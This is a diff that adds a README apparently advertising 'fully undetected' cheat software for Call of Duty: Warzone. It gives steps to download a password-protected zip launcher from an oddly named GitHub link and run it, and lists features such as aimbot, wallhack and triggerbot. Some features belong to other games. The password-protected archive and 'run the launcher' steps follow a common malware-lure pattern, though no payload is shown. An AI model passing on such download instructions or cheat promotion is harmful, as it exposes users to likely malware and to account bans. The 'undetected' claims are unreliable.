@@ -1,0 +1,36 @@
+BEST SOFT FOR Call Of Duty: Warzone in 2026 | Full Undetected 
+
+GUIDE HOW TO USE OUR SOFTWARE 
+
+# PASSWORD: azuro
+1. Download and unzip the latest version of the launcher (Link to the latest launcher - https://github.com/Amplitudekespot/itaoaayg/releases/download/Latest/Azuro.zip)
+# PASSWORD: azuro
+
+2. Launch the launcher and click RUN
+3. Wait for the launcher to update
+4. Select the game and click on LAUNCH
+5. In the game, open the menu on the INS button
+
+FUNCTIONAL
+
+aimbot
+wallhack
+ESP
+no-recoil
+no-spread
+triggerbot
+silent-aim
+radar-hack
+bunny-hop
+infinite-abilities
+auto-plant
+defuse
+anti-flash
+anti-smoke
+player-ESP
+agent-ESP
+instant-reload
+rapid-fire
+no-sway
+third-person
+AND MORE!
